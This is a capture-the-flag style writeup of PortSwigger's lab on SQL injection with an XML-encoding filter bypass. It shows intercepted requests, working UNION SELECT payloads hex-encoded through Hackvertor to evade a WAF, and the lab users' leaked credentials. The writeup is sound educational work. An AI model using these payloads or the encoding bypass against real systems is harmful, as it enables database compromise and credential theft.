---
title: SQL injection with filter bypass via XML encoding
description: A writeup of PortSwigger's SQL injection lab for SQLi with filter bypass using XML encoding.
author: Koussay Dhifi
categories: [Writeups, WebExploitation]
tags: [WebExploitation, SQLInjection, PortSwigger, Labs, UNION]
mermaid: true
---

## Introduction

This is the last SQLi lab within PortSwigger's series titled [SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding). The description of the lab is as follows.

**This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.**

## Recon

The usual PortSwigger e-commerce-like website is provided for the users, shown in the following image.

![Lab Overview](../assets/sqli/lab18/image.png)

There is no category, as usual, or anything — just products, and we view their details.

When we check a specific product, we get redirected to the URL `/product?productId=<Product-ID>` and see that we can check the stock by choosing which store we are willing to look for, shown in the following image for the case of a store in London.

![Product Overview](../assets/sqli/lab18/image%20copy.png)

If we fuzz the URL a little bit by trying to add a `'` to the productID, we get an error message telling us the productID doesn't exist, so we add `& '` and nothing changes — no error message or anything. We are going to keep this in mind; it may be some blind SQLi, but let's open Burp Suite and intercept the traffic when we check the stock of the product.

We see the following POST request being sent to the server when we check for a specific product.

```sh
POST /product/stock HTTP/2
Host: 0a270001032e5811823cc9af00c300cd.web-security-academy.net
Cookie: session=wv5IVqo7RDJEUgaAAD565UTRxcgAa5z6
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://0a270001032e5811823cc9af00c300cd.web-security-academy.net/product?productId=1&%27
Content-Type: application/xml
Content-Length: 107
Origin: https://0a270001032e5811823cc9af00c300cd.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

## Vulnerability Detection and Analysis

So the body is an XML being sent. The request basically says: "I want the product X from the store Y." So let's try something interesting by doing an operation as follows.

```xml
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1+1</productId><storeId>1</storeId></stockCheck>
```

It gets sent perfectly, and we get the units as if we sent `productId: 2`. So arithmetic operations are calculated, meaning the user input is not treated as an argument but as part of the SQL query itself that is looking for the stock. So let's try to add something interesting, like `'`.

If we send something like:

```xml
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2'</productId><storeId>1</storeId></stockCheck>
```

We get the following response.

```sh
HTTP/2 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 17

"Attack detected"
```

So we get a custom error message instead of a SQL error message or any other backend error message, so let's try to form a payload.

## Payload and Exploitation

Since we are dealing with a numerical type (because using `+` adds the values up), we do not need to use `'`, so we can use the payload:

```sql
1 UNION SELECT NULL FROM dual --
```

We get the usual "attack detected" response.

```sh
HTTP/2 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 17

"Attack detected"
```

Since we are dealing with XML, let's try some XML-encoded payload, which will be decoded naturally by the XML parser — much like HTML. Now we are going to encode the payload in hex so the XML parser will decode it automatically and pass it to the SQL query. We can use the Burp extension `Hackvertor`, which converts data we send in requests and receive in responses without the need for external tools.

So if we send the request:

```sh
POST /product/stock HTTP/2
Host: 0a270001032e5811823cc9af00c300cd.web-security-academy.net
Cookie: session=wv5IVqo7RDJEUgaAAD565UTRxcgAa5z6
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://0a270001032e5811823cc9af00c300cd.web-security-academy.net/product?productId=1&%27
Content-Type: application/xml
Content-Length: 170
Origin: https://0a270001032e5811823cc9af00c300cd.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId><@hex_entities>2 UNION SELECT NULL FROM dual -- </@hex_entities></storeId></stockCheck>
```

**NOTE: `<@hex_entities>` is part of the Hackvertor extension that converts the payload to hex encoding.**

We get the following response:

```sh
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14

868 units
null
```

You may be wondering why the payload is in `storeId` and not in `productId` — actually, both work and both show results, but one returns the stock of a specific product within a specific store, and the other returns the stock of all products within a specific store, as follows.

```sh
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 34

null
739 units
627 units
868 units
```

Since `UNION SELECT NULL -- ` worked, that means only one column is returned, so let's try to get the username and password using concatenation — but if there is a type mismatch, we are going to find another solution.

So if we inject the payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>1 <@hex_entities>UNION SELECT username || ':' || password from users -- </@hex_entities></productId>
<storeId>1</storeId>
</stockCheck>
```

We get the following response with different accounts.

```sh
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 120

administrator:oaciddc2sedhws1mpw9o
wiener:xl8x029iko84kk6tl7x8
627 units
739 units
carlos:kpthnsie672cgcghk3ef
868 units
```

Now all the credentials are leaked, and we can log in as administrator, thus solving the lab.

## Conclusion

It was a nice lab to teach more SQLi tricks, this time within a POST request using XML instead of the usual JSON or GET request. To defend against this, developers need to escape the values within the XML before passing them blindly to the SQL query.